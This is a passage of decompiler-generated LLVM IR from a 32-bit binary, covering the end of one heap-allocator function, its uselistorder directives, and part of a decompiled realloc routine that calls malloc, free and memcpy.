dec_label_pc_804c4dc:                             ; preds = %dec_label_pc_804c492, %dec_label_pc_804c4d3
  %v0_804c4dc = load i32, i32* @ebp, align 4
  %v1_804c4dc = add i32 %v0_804c4dc, 8
  store i32 %v1_804c4dc, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c4f7

dec_label_pc_804c4e1:                             ; preds = %dec_label_pc_804bfd1
  %v1_804c4e1 = load i32, i32* @ebx, align 4
  %v2_804c4e1 = add i32 %v0_804bfe0, 4
  %v3_804c4e1 = add i32 %v2_804c4e1, %v1_804c4e1
  %v4_804c4e1 = inttoptr i32 %v3_804c4e1 to i32*
  %v5_804c4e1 = load i32, i32* %v4_804c4e1, align 4
  %v6_804c4e1 = or i32 %v5_804c4e1, 1
  store i32 %v6_804c4e1, i32* %v4_804c4e1, align 4
  br label %dec_label_pc_804c4e6

dec_label_pc_804c4e6:                             ; preds = %dec_label_pc_804bfe9, %dec_label_pc_804c4e1
  %v0_804c4e6 = load i32, i32* @ecx, align 4
  store i32 %v0_804c4e6, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c4f7

dec_label_pc_804c4ea:                             ; preds = %dec_label_pc_804c2a8, %dec_label_pc_804c45e, %dec_label_pc_804c2b2
  %v0_804c4ea = load i32, i32* %stack_var_-92, align 4
  %v1_804c4ea = call i32 @__errno_location(i32 %v0_804c4ea)
  store i32 %v1_804c4ea, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804c4f1 = inttoptr i32 %v1_804c4ea to i32*
  store i32 12, i32* %v1_804c4f1, align 4
  br label %dec_label_pc_804c4f7

dec_label_pc_804c4f7:                             ; preds = %dec_label_pc_804c4e6, %dec_label_pc_804c4dc, %dec_label_pc_804c487, %dec_label_pc_804c143, %dec_label_pc_804c0f5, %dec_label_pc_804be7c, %dec_label_pc_804c4ea
  store i32 %v2_804bdb3, i32* @eax, align 4
  store i32 %v2_804bdb3, i32* %stack_var_-92, align 4
  %v2_804c500 = call i32 @__pthread_return_void(i32 %v2_804bdb3, i32 1)
  store i32 %v2_804c500, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c508

dec_label_pc_804c508:                             ; preds = %dec_label_pc_804bdd1, %dec_label_pc_804c4f7
  %v0_804c50b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804c50b, i32* %eax.global-to-local, align 4
  %v2_804c50d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804c50d, i32* @ebx, align 4
  store i32 %v0_804bda0, i32* @esi, align 4
  store i32 %v0_804bd9f, i32* @edi, align 4
  store i32 %v0_804bd9e, i32* @ebp, align 4
  ret i32 %v0_804c50b

; uselistorder directives
  uselistorder i32 %v0_804c4ce, { 1, 0 }
  uselistorder i32 %v0_804c4ae, { 1, 0, 2 }
  uselistorder i32 %v2_804c44b, { 1, 0, 2 }
  uselistorder i32 %v0_804c439, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804c3d0, { 1, 0 }
  uselistorder i32 %v2_804c3be, { 1, 0 }
  uselistorder i32 %v1_804c375, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_804c35f, { 1, 0, 2 }
  uselistorder i32 %v2_804c353, { 1, 2, 0 }
  uselistorder i32 %v2_804c34e, { 1, 0, 2 }
  uselistorder i32 %v1_804c33e, { 2, 1, 0 }
  uselistorder i8 %v0_804c30c, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_804c2ef, { 1, 0, 2 }
  uselistorder i32 %v0_804c3a391, { 2, 0, 1 }
  uselistorder i32 %v0_804c3b192, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_804c2e9, { 2, 1, 0 }
  uselistorder i32 %v8_804c2bf, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804c2bc, { 1, 0 }
  uselistorder i32 %v0_804c29b, { 1, 0 }
  uselistorder i32 %v2_804c26c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804c264, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_804c251, { 1, 0 }
  uselistorder i32 %v1_804c248, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_804c235, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_804c219, { 1, 0, 2 }
  uselistorder i32 %v2_804c205, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_804c1ce, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804c1c2, { 2, 1, 0 }
  uselistorder i32 %v8_804c1b1, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_804c198, { 1, 0, 2 }
  uselistorder i32 %v0_804c134, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804c107, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804c0fd, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804c0ef, { 1, 0 }
  uselistorder i32 %v1_804c086, { 1, 0 }
  uselistorder i32 %v3_804c07a, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804c08a, { 1, 0 }
  uselistorder i32 %v2_804c074, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804c07112, { 1, 0 }
  uselistorder i32 %v2_804c066, { 1, 0 }
  uselistorder i32 %v1_804c04a, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804c046, { 2, 1, 0 }
  uselistorder i32 %v1_804c042, { 1, 0 }
  uselistorder i32 %v1_804c036, { 2, 1, 0 }
  uselistorder i32 %v2_804c02c, { 1, 0 }
  uselistorder i32 %v1_804c029, { 1, 2, 0 }
  uselistorder i32 %v4_804bfc7, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_804c012, { 1, 0 }
  uselistorder i32 %v0_804bfe0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804bfb3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804bf80, { 1, 2, 0 }
  uselistorder i32 %v2_804bf64, { 1, 0 }
  uselistorder i32 %v1_804bf5a, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804bf55.lcssa, { 1, 0 }
  uselistorder i32 %v3_804bf45, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804bf3c, { 1, 0, 2 }
  uselistorder i32 %v2_804bf18, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804bf00, { 2, 1, 0 }
  uselistorder i32 %v0_804beec, { 2, 0, 3, 1 }
  uselistorder i32 %v3_804beb2, { 1, 0, 2 }
  uselistorder i32 %v0_804bf80111, { 0, 3, 1, 2 }
  uselistorder i32 %v3_804be5f, { 1, 0, 2 }
  uselistorder i32 %v2_804be51, { 2, 1, 0 }
  uselistorder i32 %v2_804be2c, { 2, 1, 0 }
  uselistorder i8 %v0_804bdfa, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_804c192, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_804bde3, { 0, 2, 1 }
  uselistorder i32 %v0_804bdcc, { 1, 0 }
  uselistorder i32 %v2_804bdb3, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 20, 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 0, 10, 11, 13, 14, 15, 16, 24, 17, 18, 19, 21, 22, 23 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8056da0.358, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134572660, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_8056a80.346, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8056a6c.343 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8056a6c.343 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_804c508, { 1, 0 }
  uselistorder label %dec_label_pc_804c4f7, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804c4ea, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804c4e6, { 1, 0 }
  uselistorder label %dec_label_pc_804c4dc, { 1, 0 }
  uselistorder label %dec_label_pc_804c487, { 1, 0 }
  uselistorder label %dec_label_pc_804c45e, { 1, 0 }
  uselistorder label %dec_label_pc_804c44b, { 1, 0 }
  uselistorder label %dec_label_pc_804c439, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804c3cb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c3c6, { 1, 0 }
  uselistorder label %dec_label_pc_804c3aa, { 1, 0 }
  uselistorder label %dec_label_pc_804c353, { 1, 0 }
  uselistorder label %dec_label_pc_804c33c, { 1, 0 }
  uselistorder label %dec_label_pc_804c325, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c2a8, { 1, 0 }
  uselistorder label %dec_label_pc_804c29b, { 1, 0 }
  uselistorder label %dec_label_pc_804c25c, { 1, 0 }
  uselistorder label %dec_label_pc_804c235, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804c219, { 1, 0 }
  uselistorder label %dec_label_pc_804c200, { 1, 0 }
  uselistorder label %dec_label_pc_804c1e2, { 1, 0 }
  uselistorder label %dec_label_pc_804c0fd, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804c0f5, { 1, 0 }
  uselistorder label %dec_label_pc_804c0de, { 1, 0 }
  uselistorder label %dec_label_pc_804c071, { 1, 0 }
  uselistorder label %dec_label_pc_804c076.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804c04a, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bfd1, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804bf58, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804bf41, { 1, 0 }
  uselistorder label %dec_label_pc_804beaf, { 1, 0 }
  uselistorder label %dec_label_pc_804bf80.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804be7c, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804bdfa, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_804c516 = load i32, i32* @esi, align 4
  %v0_804c517 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v4_804c51f = icmp eq i32* %arg1, null
  %v1_804c524 = icmp eq i1 %v4_804c51f, false
  br i1 %v1_804c524, label %dec_label_pc_804c536, label %dec_label_pc_804c526

dec_label_pc_804c526:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_804c52a = call i32 @malloc(i32 %arg2)
  store i32 %v1_804c52a, i32* %eax.global-to-local, align 4
  store i32 %v1_804c52a, i32* @ebx, align 4
  br label %dec_label_pc_804c82f

dec_label_pc_804c536:                             ; preds = %entry
  %v1_804c536 = icmp eq i32 %arg2, 0
  %v1_804c538 = icmp eq i1 %v1_804c536, false
  br i1 %v1_804c538, label %dec_label_pc_804c54b, label %dec_label_pc_804c53a

dec_label_pc_804c53a:                             ; preds = %dec_label_pc_804c536
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_804c541 = call i32 @free(i32 %tmp7)
  store i32 %v1_804c541, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c82f

dec_label_pc_804c54b:                             ; preds = %dec_label_pc_804c536
  %v2_804c556 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804c556, i32* @eax, align 4
  store i32 %v2_804c556, i32* %stack_var_-60, align 4
  %v2_804c55b = call i32 @__pthread_return_void(i32 %v2_804c556, i32 134534955)
  store i32 %v2_804c55b, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8054210.341 to i32), i32* %stack_var_-60, align 4
  %v1_804c567 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8054210.341 to i32))
  store i32 %v1_804c567, i32* %eax.global-to-local, align 4
  %v0_804c56f = load i32, i32* @ebx, align 4
  %tmp20 = icmp ult i32 %v0_804c56f, -32
  br i1 %tmp20, label %dec_label_pc_804c586, label %dec_label_pc_804c574

dec_label_pc_804c574:                             ; preds = %dec_label_pc_804c54b
  %v0_804c574 = load i32, i32* %stack_var_-60, align 4
  %v1_804c574 = call i32 @__errno_location(i32 %v0_804c574)
  store i32 %v1_804c574, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804c57b = inttoptr i32 %v1_804c574 to i32*
  store i32 12, i32* %v1_804c57b, align 4
  br label %dec_label_pc_804c832

dec_label_pc_804c586:                             ; preds = %dec_label_pc_804c54b
  %v1_804c586 = add i32 %v0_804c56f, 11
  %tmp21 = icmp ult i32 %v1_804c586, 16
  br i1 %tmp21, label %dec_label_pc_804c59d, label %dec_label_pc_804c596

dec_label_pc_804c596:                             ; preds = %dec_label_pc_804c586
  %v1_804c596 = and i32 %v1_804c586, -8
  br label %dec_label_pc_804c59d

dec_label_pc_804c59d:                             ; preds = %dec_label_pc_804c586, %dec_label_pc_804c596
  %stack_var_-40.0 = phi i32 [ %v1_804c596, %dec_label_pc_804c596 ], [ 16, %dec_label_pc_804c586 ]
  %storemerge27 = phi i32 [ %v1_804c596, %dec_label_pc_804c596 ], [ %v1_804c586, %dec_label_pc_804c586 ]
  store i32 %storemerge27, i32* %eax.global-to-local, align 4
  %v1_804c5a1 = add i32 %tmp7, -8
  store i32 %v1_804c5a1, i32* @edi, align 4
  %v1_804c5a4 = add i32 %tmp7, -4
  %v2_804c5a4 = inttoptr i32 %v1_804c5a4 to i32*
  %v3_804c5a4 = load i32, i32* %v2_804c5a4, align 4
  store i32 %v3_804c5a4, i32* @edx, align 4
  %v1_804c5a9 = and i32 %v3_804c5a4, -4
  store i32 %v1_804c5a9, i32* %eax.global-to-local, align 4
  %v2_804c5b0 = and i32 %v3_804c5a4, 2
  %v3_804c5b0 = icmp eq i32 %v2_804c5b0, 0
  %v1_804c5b3 = icmp eq i1 %v3_804c5b0, false
  br i1 %v1_804c5b3, label %dec_label_pc_804c74d, label %dec_label_pc_804c5b9

dec_label_pc_804c5b9:                             ; preds = %dec_label_pc_804c59d
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_804c5a9, i32* @ebx, align 4
  %v7_804c5bf = icmp ult i32 %v1_804c5a9, %stack_var_-40.0
  %v1_804c5c1 = icmp eq i1 %v7_804c5bf, false
  br i1 %v1_804c5c1, label %dec_label_pc_804c6f8, label %dec_label_pc_804c5c7

dec_label_pc_804c5c7:                             ; preds = %dec_label_pc_804c5b9
  %v2_804c5c7 = add i32 %v1_804c5a9, %v1_804c5a1
  store i32 %v2_804c5c7, i32* @esi, align 4
  %v1_804c5ca = load i32, i32* @global_var_8056a6c.343, align 4
  %v12_804c5ca = icmp eq i32 %v2_804c5c7, %v1_804c5ca
  %v1_804c5d0 = icmp eq i1 %v12_804c5ca, false
  %v1_804c60a = add i32 %v2_804c5c7, 4
  %v2_804c60a = inttoptr i32 %v1_804c60a to i32*
  %v3_804c60a = load i32, i32* %v2_804c60a, align 4
  br i1 %v1_804c5d0, label %dec_label_pc_804c60a, label %dec_label_pc_804c5d2

dec_label_pc_804c5d2:                             ; preds = %dec_label_pc_804c5c7
  %v1_804c5d7 = and i32 %v3_804c60a, -4
  %v2_804c5da = add i32 %v1_804c5d7, %v1_804c5a9
  store i32 %v2_804c5da, i32* %ecx.global-to-local, align 4
  %v1_804c5e0 = add i32 %stack_var_-40.0, 16
  store i32 %v1_804c5e0, i32* %eax.global-to-local, align 4
  %v7_804c5e3 = icmp ult i32 %v2_804c5da, %v1_804c5e0
  br i1 %v7_804c5e3, label %dec_label_pc_804c648, label %dec_label_pc_804c5e7

dec_label_pc_804c5e7:                             ; preds = %dec_label_pc_804c5d2
  %v1_804c5e7 = urem i32 %v3_804c5a4, 2
  %v5_804c5ea = or i32 %v1_804c5e7, %stack_var_-40.0
  store i32 %v5_804c5ea, i32* @edx, align 4
  store i32 %v5_804c5ea, i32* %v2_804c5a4, align 4
  %v0_804c5f5 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c5f5 = sub i32 %v0_804c5f5, %stack_var_-40.0
  %v0_804c5f7 = load i32, i32* @edi, align 4
  %v2_804c5f7 = add i32 %v0_804c5f7, %stack_var_-40.0
  store i32 %v2_804c5f7, i32* %eax.global-to-local, align 4
  %v1_804c5fa = or i32 %v2_804c5f5, 1
  store i32 %v1_804c5fa, i32* %ecx.global-to-local, align 4
  store i32 %v2_804c5f7, i32* @global_var_8056a6c.343, align 4
  %v2_804c602 = add i32 %v2_804c5f7, 4
  %v3_804c602 = inttoptr i32 %v2_804c602 to i32*
  store i32 %v1_804c5fa, i32* %v3_804c602, align 4
  br label %dec_label_pc_804c81d

dec_label_pc_804c60a:                             ; preds = %dec_label_pc_804c5c7
  %v1_804c60f = and i32 %v3_804c60a, -2
  store i32 %v1_804c60f, i32* %eax.global-to-local, align 4
  %v3_804c612 = add i32 %v1_804c60a, %v1_804c60f
  %v4_804c612 = inttoptr i32 %v3_804c612 to i8*
  %v5_804c612 = load i8, i8* %v4_804c612, align 1
  %v6_804c612 = urem i8 %v5_804c612, 2
  %v7_804c612 = icmp eq i8 %v6_804c612, 0
  %v1_804c617 = icmp eq i1 %v7_804c612, false
  br i1 %v1_804c617, label %dec_label_pc_804c648, label %dec_label_pc_804c619

dec_label_pc_804c619:                             ; preds = %dec_label_pc_804c60a
  %v1_804c619 = and i32 %v3_804c60a, -4
  %v2_804c620 = add i32 %v1_804c619, %v1_804c5a9
  store i32 %v2_804c620, i32* @ebx, align 4
  %v10_804c622 = icmp ult i32 %v2_804c620, %stack_var_-40.0
  br i1 %v10_804c622, label %dec_label_pc_804c648, label %dec_label_pc_804c628

dec_label_pc_804c628:                             ; preds = %dec_label_pc_804c619
  %v1_804c628 = add i32 %v1_804c5a9, %tmp7
  %v2_804c628 = inttoptr i32 %v1_804c628 to i32*
  %v3_804c628 = load i32, i32* %v2_804c628, align 4
  store i32 %v3_804c628, i32* @edx, align 4
  %v1_804c62b = add i32 %v2_804c5c7, 12
  %v2_804c62b = inttoptr i32 %v1_804c62b to i32*
  %v3_804c62b = load i32, i32* %v2_804c62b, align 4
  store i32 %v3_804c62b, i32* %eax.global-to-local, align 4
  %v1_804c62e = add i32 %v3_804c628, 12
  %v2_804c62e = inttoptr i32 %v1_804c62e to i32*
  %v3_804c62e = load i32, i32* %v2_804c62e, align 4
  %v15_804c62e = icmp eq i32 %v3_804c62e, %v2_804c5c7
  %v1_804c631 = icmp eq i1 %v15_804c62e, false
  br i1 %v1_804c631, label %dec_label_pc_804c638, label %dec_label_pc_804c633

dec_label_pc_804c633:                             ; preds = %dec_label_pc_804c628
  %v1_804c633 = add i32 %v3_804c62b, 8
  %v2_804c633 = inttoptr i32 %v1_804c633 to i32*
  %v3_804c633 = load i32, i32* %v2_804c633, align 4
  %v15_804c633 = icmp eq i32 %v3_804c633, %v2_804c5c7
  br i1 %v15_804c633, label %dec_label_pc_804c63d, label %dec_label_pc_804c638

dec_label_pc_804c638:                             ; preds = %dec_label_pc_804c633, %dec_label_pc_804c628
  %v0_804c638 = call i32 @abort()
  store i32 %v0_804c638, i32* %eax.global-to-local, align 4
  %v1_804c63d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804c63d

dec_label_pc_804c63d:                             ; preds = %dec_label_pc_804c633, %dec_label_pc_804c638
  %v1_804c63d = phi i32 [ %v3_804c628, %dec_label_pc_804c633 ], [ %v1_804c63d.pre, %dec_label_pc_804c638 ]
  %v0_804c63d = phi i32 [ %v3_804c62b, %dec_label_pc_804c633 ], [ %v0_804c638, %dec_label_pc_804c638 ]
  %v2_804c63d = add i32 %v1_804c63d, 12
  %v3_804c63d = inttoptr i32 %v2_804c63d to i32*
  store i32 %v0_804c63d, i32* %v3_804c63d, align 4
  %v0_804c640 = load i32, i32* @edx, align 4
  %v1_804c640 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c640 = add i32 %v1_804c640, 8
  %v3_804c640 = inttoptr i32 %v2_804c640 to i32*
  store i32 %v0_804c640, i32* %v3_804c640, align 4
  %v0_804c6f8.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c6f8

dec_label_pc_804c648:                             ; preds = %dec_label_pc_804c619, %dec_label_pc_804c60a, %dec_label_pc_804c5d2
  %v1_804c64f = add i32 %stack_var_-40.0, -7
  store i32 %v1_804c64f, i32* %eax.global-to-local, align 4
  store i32 %v1_804c64f, i32* %stack_var_-60, align 4
  %v1_804c653 = call i32 @malloc(i32 %v1_804c64f)
  store i32 %v1_804c653, i32* %eax.global-to-local, align 4
  store i32 %v1_804c653, i32* @edx, align 4
  %v1_804c65d = icmp eq i32 %v1_804c653, 0
  br i1 %v1_804c65d, label %dec_label_pc_804c819, label %dec_label_pc_804c665

dec_label_pc_804c665:                             ; preds = %dec_label_pc_804c648
  %v1_804c665 = add i32 %v1_804c653, -8
  store i32 %v1_804c665, i32* %ebx.global-to-local, align 4
  %v1_804c668 = load i32, i32* @esi, align 4
  %v12_804c668 = icmp eq i32 %v1_804c665, %v1_804c668
  %v1_804c66a = add i32 %v1_804c653, -4
  %v2_804c66a = inttoptr i32 %v1_804c66a to i32*
  %v3_804c66a = load i32, i32* %v2_804c66a, align 4
  store i32 %v3_804c66a, i32* %eax.global-to-local, align 4
  %v1_804c66d = icmp eq i1 %v12_804c668, false
  br i1 %v1_804c66d, label %dec_label_pc_804c67b, label %dec_label_pc_804c66f

dec_label_pc_804c66f:                             ; preds = %dec_label_pc_804c665
  %v1_804c66f = and i32 %v3_804c66a, -4
  store i32 %v1_804c66f, i32* %eax.global-to-local, align 4
  store i32 %v1_804c5a9, i32* @edx, align 4
  %v2_804c676 = add i32 %v1_804c66f, %v1_804c5a9
  store i32 %v2_804c676, i32* @ebx, align 4
  br label %dec_label_pc_804c6f8

dec_label_pc_804c67b:                             ; preds = %dec_label_pc_804c665
  %v1_804c67f = add i32 %v1_804c5a9, -4
  store i32 %v1_804c67f, i32* %eax.global-to-local, align 4
  %v2_804c684 = udiv i32 %v1_804c67f, 4
  store i32 %v2_804c684, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804c67f, 37
  br i1 %tmp, label %dec_label_pc_804c69d, label %dec_label_pc_804c68c

dec_label_pc_804c68c:                             ; preds = %dec_label_pc_804c67b
  store i32 %v1_804c653, i32* %stack_var_-60, align 4
  %v3_804c693 = inttoptr i32 %v1_804c653 to i16*
  %v4_804c693 = call i32 @memcpy(i16* %v3_804c693, i32 %tmp7, i32 %v1_804c67f)
  store i32 %v4_804c693, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c6e4

dec_label_pc_804c69d:                             ; preds = %dec_label_pc_804c67b
  store i32 %tmp7, i32* @esi, align 4
  %v2_804c6a4 = load i32, i32* %arg1, align 4
  store i32 %v2_804c6a4, i32* %eax.global-to-local, align 4
  %v2_804c6a6 = inttoptr i32 %v1_804c653 to i32*
  store i32 %v2_804c6a4, i32* %v2_804c6a6, align 4
  %v0_804c6a8 = load i32, i32* @esi, align 4
  %v1_804c6a8 = add i32 %v0_804c6a8, 4
  %v2_804c6a8 = inttoptr i32 %v1_804c6a8 to i32*
  %v3_804c6a8 = load i32, i32* %v2_804c6a8, align 4
  store i32 %v3_804c6a8, i32* %eax.global-to-local, align 4
  %v1_804c6ab = load i32, i32* @edx, align 4
  %v2_804c6ab = add i32 %v1_804c6ab, 4
  %v3_804c6ab = inttoptr i32 %v2_804c6ab to i32*
  store i32 %v3_804c6a8, i32* %v3_804c6ab, align 4
  %v0_804c6ae = load i32, i32* @esi, align 4
  %v1_804c6ae = add i32 %v0_804c6ae, 8
  %v2_804c6ae = inttoptr i32 %v1_804c6ae to i32*
  %v3_804c6ae = load i32, i32* %v2_804c6ae, align 4
  store i32 %v3_804c6ae, i32* %eax.global-to-local, align 4
  %v1_804c6b1 = load i32, i32* @edx, align 4
  %v2_804c6b1 = add i32 %v1_804c6b1, 8
  %v3_804c6b1 = inttoptr i32 %v2_804c6b1 to i32*
  store i32 %v3_804c6ae, i32* %v3_804c6b1, align 4
  %tmp28 = icmp ult i32 %v1_804c67f, 17
  br i1 %tmp28, label %dec_label_pc_804c6e4, label %dec_label_pc_804c6b6

dec_label_pc_804c6b6:                             ; preds = %dec_label_pc_804c69d
  %v0_804c6b6 = load i32, i32* @esi, align 4
  %v1_804c6b6 = add i32 %v0_804c6b6, 12
  %v2_804c6b6 = inttoptr i32 %v1_804c6b6 to i32*
  %v3_804c6b6 = load i32, i32* %v2_804c6b6, align 4
  store i32 %v3_804c6b6, i32* %eax.global-to-local, align 4
  %v0_804c6b9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c6bc = load i32, i32* @edx, align 4
  %v2_804c6bc = add i32 %v1_804c6bc, 12
  %v3_804c6bc = inttoptr i32 %v2_804c6bc to i32*
  store i32 %v3_804c6b6, i32* %v3_804c6bc, align 4
  %v0_804c6bf = load i32, i32* @esi, align 4
  %v1_804c6bf = add i32 %v0_804c6bf, 16
  %v2_804c6bf = inttoptr i32 %v1_804c6bf to i32*
  %v3_804c6bf = load i32, i32* %v2_804c6bf, align 4
  store i32 %v3_804c6bf, i32* %eax.global-to-local, align 4
  %v1_804c6c2 = load i32, i32* @edx, align 4
  %v2_804c6c2 = add i32 %v1_804c6c2, 16
  %v3_804c6c2 = inttoptr i32 %v2_804c6c2 to i32*
  store i32 %v3_804c6bf, i32* %v3_804c6c2, align 4
  %tmp22 = icmp ult i32 %v0_804c6b9, 7
  br i1 %tmp22, label %dec_label_pc_804c6e4, label %dec_label_pc_804c6c7

dec_label_pc_804c6c7:                             ; preds = %dec_label_pc_804c6b6
  %v0_804c6c7 = load i32, i32* @esi, align 4
  %v1_804c6c7 = add i32 %v0_804c6c7, 20
  %v2_804c6c7 = inttoptr i32 %v1_804c6c7 to i32*
  %v3_804c6c7 = load i32, i32* %v2_804c6c7, align 4
  store i32 %v3_804c6c7, i32* %eax.global-to-local, align 4
  %v0_804c6ca = load i32, i32* %ecx.global-to-local, align 4
  %v1_804c6cd = load i32, i32* @edx, align 4
  %v2_804c6cd = add i32 %v1_804c6cd, 20
  %v3_804c6cd = inttoptr i32 %v2_804c6cd to i32*
  store i32 %v3_804c6c7, i32* %v3_804c6cd, align 4
  %v0_804c6d0 = load i32, i32* @esi, align 4
  %v1_804c6d0 = add i32 %v0_804c6d0, 24
  %v2_804c6d0 = inttoptr i32 %v1_804c6d0 to i32*
  %v3_804c6d0 = load i32, i32* %v2_804c6d0, align 4
  store i32 %v3_804c6d0, i32* %eax.global-to-local, align 4
  %v1_804c6d3 = load i32, i32* @edx, align 4
  %v2_804c6d3 = add i32 %v1_804c6d3, 24
  %v3_804c6d3 = inttoptr i32 %v2_804c6d3 to i32*
  store i32 %v3_804c6d0, i32* %v3_804c6d3, align 4
  %tmp23 = icmp ult i32 %v0_804c6ca, 9
  br i1 %tmp23, label %dec_label_pc_804c6e4, label %dec_label_pc_804c6d8

dec_label_pc_804c6d8:                             ; preds = %dec_label_pc_804c6c7
  %v0_804c6d8 = load i32, i32* @esi, align 4
  %v1_804c6d8 = add i32 %v0_804c6d8, 28
  %v2_804c6d8 = inttoptr i32 %v1_804c6d8 to i32*
  %v3_804c6d8 = load i32, i32* %v2_804c6d8, align 4
  store i32 %v3_804c6d8, i32* %eax.global-to-local, align 4
  %v1_804c6db = load i32, i32* @edx, align 4
  %v2_804c6db = add i32 %v1_804c6db, 28
  %v3_804c6db = inttoptr i32 %v2_804c6db to i32*
  store i32 %v3_804c6d8, i32* %v3_804c6db, align 4
  %v0_804c6de = load i32, i32* @esi, align 4
  %v1_804c6de = add i32 %v0_804c6de, 32
  %v2_804c6de = inttoptr i32 %v1_804c6de to i32*
  %v3_804c6de = load i32, i32* %v2_804c6de, align 4
  store i32 %v3_804c6de, i32* %eax.global-to-local, align 4
  %v1_804c6e1 = load i32, i32* @edx, align 4
  %v2_804c6e1 = add i32 %v1_804c6e1, 32
  %v3_804c6e1 = inttoptr i32 %v2_804c6e1 to i32*
  store i32 %v3_804c6de, i32* %v3_804c6e1, align 4
  br label %dec_label_pc_804c6e4

